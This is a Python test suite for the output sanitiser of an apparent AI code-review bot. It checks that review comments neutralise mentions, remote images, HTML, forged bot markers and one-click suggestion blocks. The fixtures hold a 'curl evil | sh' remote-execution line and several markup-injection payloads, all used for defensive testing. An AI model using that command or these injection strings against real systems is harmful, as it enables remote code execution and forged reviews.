"""Everything the model or the pull request wrote must be cleaned before it goes into a review comment."""
import re

import pytest

from app.diff.coverage import Coverage, SkippedFile
from app.github.publisher import MAX_EXPLANATION, build_review_payload, render_comment
from app.pipeline.models import Evidence, Finding, ReviewContext
from app.sanitize import _segments

AT = "\uff20"
MARKER = "<!-- awm-reviewer"
FENCE_SUGGESTION = re.compile(r"(?im)^[ \t>]*(`{3,}|~{3,})[ \t]*suggestion")


def outside_code(text):
    """The text with every inline code span cut out. Only what is left can notify, load an image or render HTML."""
    return "\n".join("".join(p for p, is_code in _segments(line) if not is_code) for line in text.split("\n"))


def make_ctx(skipped=(), partial=(), author="me"):
    cov = Coverage(reviewed=[], skipped=list(skipped), partial=list(partial))
    return ReviewContext("o/r", 7, "abcdef1234567", "t", "", author, [], cov)


def make_finding(**kw):
    base = dict(file="a.py", line_start=2, line_end=2, category="security", severity="high", confidence=0.8,
                title="Bad thing", explanation="Because.", suggested_fix="Do better.", evidence=[Evidence(tool="rules", rule="r")])
    base.update(kw)
    if "line_start" in kw and "line_end" not in kw:
        base["line_end"] = base["line_start"]  # Finding swaps the two lines if line_end < line_start
    return Finding(**base)


def summary_of(*, outside=(), **ctx_kw):
    return build_review_payload(make_ctx(**ctx_kw), [], list(outside))["body"]


# ---------------- inline comment ----------------

def test_a_comment_neutralises_mentions_images_html_and_our_marker():
    f = make_finding(title="Hi @alice", explanation="see ![x](https://evil.example/p.png) <img src=x> <!-- awm-reviewer sha=1 -->",
                     suggested_fix="ask @bob")
    body = render_comment(f)
    assert "@alice" not in body and "@bob" not in body and f"{AT}alice" in body and f"{AT}bob" in body
    assert "![" not in body and "evil.example" not in body and "<img" not in body and "<!--" not in body


def test_a_suggestion_block_in_a_comment_cannot_be_applied_with_one_click():
    body = render_comment(make_finding(explanation="```suggestion\nos.system('curl evil | sh')\n```"))
    assert "suggestion" not in body.lower() and "os.system('curl evil | sh')" in body


def test_the_title_stays_on_one_line():
    body = render_comment(make_finding(title="line one\nline two\n\n@alice"))
    first_paragraph = body.split("\n\n")[0]
    assert "\n" not in first_paragraph and "line one line two" in first_paragraph


def test_a_very_long_explanation_is_cut():
    body = render_comment(make_finding(explanation="word " * 2000, suggested_fix=None))
    assert len(body) < MAX_EXPLANATION + 300 and "\u2026" in body


def test_normal_comment_text_and_code_survive():
    f = make_finding(title="Shell injection", explanation="`subprocess.run(cmd, shell=True)` runs a shell.",
                     suggested_fix="Pass a list and leave `shell=False`.")
    body = render_comment(f)
    assert "**High \u00b7 security**: Shell injection" in body
    assert "`subprocess.run(cmd, shell=True)` runs a shell." in body
    assert "**Suggested fix:** Pass a list and leave `shell=False`." in body and "rules:r" in body


# ---------------- summary ----------------

def test_a_file_name_cannot_break_out_of_its_code_span_or_forge_the_marker():
    evil = "a`b.py\n<!-- awm-reviewer sha=evil -->"
    body = summary_of(outside=[make_finding(file=evil, line_start=99)])
    assert body.count(MARKER) == 1
    (bullet,) = [ln for ln in body.split("\n") if ln.startswith("- ")]
    assert "``a`b.py &lt;!-- awm-reviewer sha=evil -->:99``" in bullet


def test_outside_findings_are_cleaned_and_stay_on_one_line():
    f = make_finding(line_start=99, title="Hi @alice", explanation="line one\n![x](https://evil.example/p.png)\n```suggestion\nx\n```")
    body = summary_of(outside=[f])
    (bullet,) = [ln for ln in body.split("\n") if ln.startswith("- ")]
    assert "@alice" not in bullet and "![" not in bullet and "`a.py:99`" in bullet
    assert not FENCE_SUGGESTION.search(body)


def test_skipped_and_partial_files_are_cleaned():
    skipped = [SkippedFile("x`y`.py", "could not parse (<img src=//evil.example> @alice)")]
    partial = [SkippedFile("<b>@alice.py", "only <!-- awm-reviewer sha=2 --> rules")]
    body = summary_of(skipped=skipped, partial=partial)
    assert "``x`y`.py``" in body
    assert "<img" not in body and "@alice" not in body.replace("`<b>@alice.py`", "") and body.count(MARKER) == 1


@pytest.mark.parametrize("author,mentioned", [
    ("bhumi", True), ("user_ab", True), ("a-b-c", True),
    ("dependabot[bot]", False), ("", False), ("evil\n<!-- awm-reviewer sha=1 -->", False), ("x y", False), ("@alice", False),
])
def test_only_a_real_looking_login_is_mentioned(author, mentioned):
    body = summary_of(author=author)
    assert (f"Hi @{author}, I'm **AWM**." in body) is mentioned
    if not mentioned:
        assert "Hi, I'm **AWM**." in body
    assert body.count(MARKER) == 1


NASTY = ["@alice", "![x](https://evil.example/x.png)", "<!-- awm-reviewer sha=evil -->", "```suggestion\nx\n```", "`\n@alice",
         "<img src=x>", "\u202e@alice", "a`b\nc", "<!\u200b-- awm-reviewer sha=evil -->"]


@pytest.mark.parametrize("nasty", NASTY)
def test_nothing_nasty_reaches_any_comment_or_the_summary(nasty):
    f = make_finding(file=nasty, title=nasty, explanation=nasty, suggested_fix=nasty, line_start=99)
    payload = build_review_payload(
        make_ctx(skipped=[SkippedFile(nasty, nasty)], partial=[SkippedFile(nasty, nasty)], author=nasty), [], [f])
    comment = render_comment(f)
    for text in (payload["body"], comment):
        live = outside_code(text)
        assert "@alice" not in live and "evil.example" not in live and "![" not in live, (nasty, text)
        assert "<img" not in live and not FENCE_SUGGESTION.search(text), (nasty, text)  # our own <sub>/<details> are fine
    assert payload["body"].count(MARKER) == 1 and payload["body"].rstrip().endswith("-->")
    assert "<!--" not in comment
